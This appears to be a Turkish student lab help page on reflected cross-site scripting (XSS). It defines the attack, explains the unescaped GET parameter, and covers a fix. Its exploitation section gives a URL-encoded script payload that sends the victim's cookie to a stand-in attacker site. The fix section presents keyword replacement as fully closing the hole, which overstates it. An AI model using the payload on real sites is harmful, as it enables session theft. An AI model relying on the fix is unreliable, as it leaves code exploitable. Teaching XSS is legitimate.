<!DOCTYPE html>
<html>
<head>
	<title>XSS YARDIM SAYFASI</title>

	<!-- TURKCE KARAKTER GOSTERME SORUNU OLMAMASI ICIN: -->	
	<meta http-equiv="content-type" content="text/html; charset=UTFX">

</head>
<body>

<center><h2>XSS</h2></center>

<hr />

<u><h3>AÇIKLAMA:</h3></u>
<div>
	<p>
		
		XSS temel olarak bir web uyglamasında kullanıcıdan alından değerler doğrudan ekrana basılması sonucu oluşan açığı kullanan saldırı türüdür. Yani kötü niyetli bir kullanıcının web uygulamasında girilmesi beklenen değer yerine Html veya Javascript kodları eklemesi ile yapılan bir saldırıdır. Genelde Javascript kodları yardımı ile cookie çalınır. Elde edilen bu cookie ile web uygulamasına kullanıcı girişi yapmaksızın çalınan cookie'nin sahibinin hesabı ile işlemler yapılabilir.

	</p>
</div>

<br />
<hr />
<br />

<u><h3>AÇIK OLUŞMASININ NEDENİ:</h3></u>
<div>
	<img src="xss_1.png" width="100%" />
	<p>
		10. satırda kullanıcı tarafından sayfaya GET ile gönderilen parametre alınmaktadır. Hatanın asıl oluştuğu kısım burasıdır. Çünkü parametreler hiçbir kontrolden geçirilmeksizin alınmıştır. Bu da parametrelerin içerisinde ne olduğunu bilmediğimiz anlamına gelmektedir. İçerisinde ne olduğunu bilmediğimiz bu parametreleri 15. satırda ekrana basıılıyor. Eğer kullanıcı kötü niyetli biri ise muhtemelen sayfaya gelen parametrelerin içerisinde Html veya Javascript kodları bulunmaktadır ve bu ifadeler 10. satırda ekrana basılmış olacaktır. Bu ekrana basma işlemi ile html veya javascript kodları çalışacak ve cookie çalmak gibi işlemlerde bulunulacaktır.
	</p>
</div>


<br />
<hr />
<br />


<u><h3>SÖMÜRÜ:</h3></u>
<div>
	<p>
		
		Ekrana Html veya Javascript kodları basmak dolayısıyla çalıştırmak için yapılması gereken yorum istenen yere html veya javascript kodları yazmak yeterli olacaktır.
		<br /><br />
		Örneğin; XSS saldırılarında genel olarak cookie çalma işlemleri yapılmakdır. Aşağıdaki kod da cookie'nizi alarak saldırganın sitesine yönlendirerek cookie değerinizi saldırganın elde etmesini sağlamaktadır.<br />
		Not:html karakterlerini url'de gösterebilmek için kodlamalar kullanılmıştır(url endcoding).
		<br /><br />
		
		<textarea cols="60" rows="3">http://localhost/yazlab/xss/index.php?yorum=<script>window.location.href%3D'saldirganinsitesi%2Findex.php%3Fcookie%3D'%2Bdocument.cookie<%2Fscript>
		</textarea>


	</p>
</div>


<br />
<hr />
<br />


<u><h3>AÇIĞI KAPATMA:</h3></u>
<div>
	<img src="xss_2.png" width="100%" />
	<p>
		13. satırda tanımlanan kelimelerin html ve javascript için özel anlamı vardır. Bu kelimelerin yardımı ile XSS saldırısı yapılabilmektedir. Sayfaya parametre olarak gelen komut 14. satırda bu özel anlamlı kelimelerden arındırılmaktadır. Bu işlem değiştirme(replace) olarak bilinmektedir. Kötü niyetli kullanıcı zararlı bir kod girmek için bu özel anlamlı kelimelere ihtiyaç duymaktadır. Ama bu kelimeler komuttan temizlendiği için böyle bir ihtimal kalmamaktadır.
	</p>
</div>


<br />
<hr />
<br />


</body>
</html>